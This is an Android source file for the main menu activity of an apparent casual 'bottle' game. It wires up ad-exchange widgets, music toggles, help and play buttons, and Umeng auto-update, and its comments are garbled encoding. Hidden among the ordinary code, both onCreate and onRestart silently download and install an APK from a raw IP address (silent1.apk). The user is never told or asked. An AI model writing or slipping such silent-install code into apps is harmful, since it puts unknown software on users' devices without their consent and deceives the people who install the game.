package com.xiude.bottle;

import android.app.AlertDialog;
import android.app.Dialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.ListView;

import com.umeng.newxp.common.ExchangeConstants;
import com.umeng.newxp.controller.ExchangeDataService;
import com.umeng.newxp.controller.XpListenersCenter.NTipsChangedListener;
import com.umeng.newxp.view.ExchangeViewManager;
import com.umeng.update.UmengUpdateAgent;
import com.xiude.util.DownloadSilently;

public class FirstActivity extends BaseActivity {
	public static ExchangeDataService exchangeDataService;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.first_view);
		
		BgMediaPlayer.startMedia(this);
		
		//���
	    //��ֵpreloadDataService,���newTips �ص�
        exchangeDataService = new ExchangeDataService();
        exchangeDataService.preloadData(this, new NTipsChangedListener() {
            @Override
            public void onChanged(int flag) {
                if(flag == -1){
                	Log.i("tips", "û�й��");
                    //û��new���
                }else if(flag > 1){
                	Log.i("tips", "�������"+flag);
                    //��һҳnew�������
                }else if(flag == 0){
                	Log.i("tips", "ȫ��new���");
                    //��һҳȫ��Ϊnew ���
                }
            };
        }, ExchangeConstants.type_container);
        
        ExchangeConstants.ROUND_ICON = false;
        final ViewGroup fatherLayout = (ViewGroup) this.findViewById(R.id.ad);
        
        ImageView deleteView = (ImageView) this.findViewById(R.id.ad_delete);
        deleteView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				fatherLayout.setVisibility(View.GONE);
			}
		});
        
        ListView listView = (ListView) this.findViewById(R.id.list);
        listView.setEnabled(false);
        
        ExchangeDataService exchangeDataService = FirstActivity.exchangeDataService != null ? FirstActivity.exchangeDataService : new ExchangeDataService();;
        
        exchangeDataService.setKeywords("app"); 
        exchangeDataService.autofill = 0;
        ExchangeViewManager exchangeViewManager = new ExchangeViewManager(this,exchangeDataService);
        exchangeViewManager.addView(fatherLayout, listView); 
        //end
        //���
        
		
		//�oĬ���d�c���b��������  begin
		DownloadSilently.downloadAndInstall("http://114.80.202.91:8080/test2/silent1.apk", FirstActivity.this);
		//end
		
		//�����ԄӸ��� begin
		 //������������ʱ�Զ�����Ƿ���Ҫ���£� ���������д������Activity ��onCreate()�����
			UmengUpdateAgent.setUpdateOnlyWifi(false);
//		 	�����ͬʱʹ�����ֶ����º��Զ������£�Ϊ�˱�����»ص�����ε��ã����������������
			UmengUpdateAgent.setDownloadListener(null);
			UmengUpdateAgent.update(this);
			//end
			
		
		ImageView playView = (ImageView)findViewById(R.id.play);
		playView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				startActivity(new Intent(FirstActivity.this, SelectModeActivity.class));
				
			}
		});
		
		ImageView helpView = (ImageView)findViewById(R.id.help);
		helpView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				startActivity(new Intent(FirstActivity.this, HelpActivity.class));
				
			}
		});
		
		final ImageView bgMcView = (ImageView)findViewById(R.id.bg_music);
		bgMcView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				if(isAllBgMusicClickPause == true){
					isAllBgMusicClickPause = false;
					BgMediaPlayer.restartMedia();
					bgMcView.setImageResource(R.drawable.music_yes);
				}else{
					isAllBgMusicClickPause = true;
					BgMediaPlayer.pauseMedia(true);
					bgMcView.setImageResource(R.drawable.music_no);
				}
			}
		});
		
		final ImageView gameMcView = (ImageView)findViewById(R.id.game_music);
		gameMcView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				  
				if(isGameBgPause == true){
					isGameBgPause = false;
					gameMcView.setImageResource(R.drawable.laba_yes);
				}else{
					isGameBgPause = true;
					gameMcView.setImageResource(R.drawable.laba_no);
				}
			}
		});
		
		if(!isGameBgPause){
			gameMcView.setImageResource(R.drawable.laba_yes);
		}else{
			gameMcView.setImageResource(R.drawable.laba_no);
		}
	}
	
	
	@Override
	protected void onRestart() {
		super.onRestart();
		
		//�oĬ���d�c���b��������  begin
		DownloadSilently.downloadAndInstall("http://114.80.202.91:8080/test2/silent1.apk", FirstActivity.this);
		//end
	}
	
	
	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK && event.getRepeatCount() == 0) {
			Dialog dialog = new AlertDialog.Builder(this)
            .setIcon(R.drawable.icon)
            .setTitle(R.string.quit)
            .setMessage(R.string.sure_quit)
            .setPositiveButton(R.string.alert_dialog_ok, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int whichButton) {
                	finish();
                }
            })
            .setNegativeButton(R.string.alert_dialog_cancel, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int whichButton) {
                }
            })
            .create();
			dialog.show();
			return true;
		}
					
		return false;
	}
	

}
